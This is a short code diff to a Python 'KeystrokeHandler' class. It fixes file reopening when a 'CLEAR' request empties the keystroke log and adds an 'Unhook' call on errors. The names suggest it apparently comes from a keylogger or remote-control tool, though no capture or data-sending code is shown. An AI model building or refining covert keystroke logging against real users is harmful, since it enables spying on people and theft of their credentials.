@@ -102,9 +102,9 @@ class KeystrokeHandler:
                 pass
             elif reqCode == "CLEAR":
                 file.close()
-                file.open(self.filepath, "w")
+                file = open(self.filepath, "w")
                 file.close()
-                file.open(self.filepath, "a+")
+                file = open(self.filepath, "a+")
             else:
                 return HandlerState.INVALID, None
 
@@ -112,6 +112,7 @@ class KeystrokeHandler:
             pass
         except Exception as e:
             print(e)
+            self.Unhook()
             return HandlerState.FAILED, None
 
     def Hook(self):
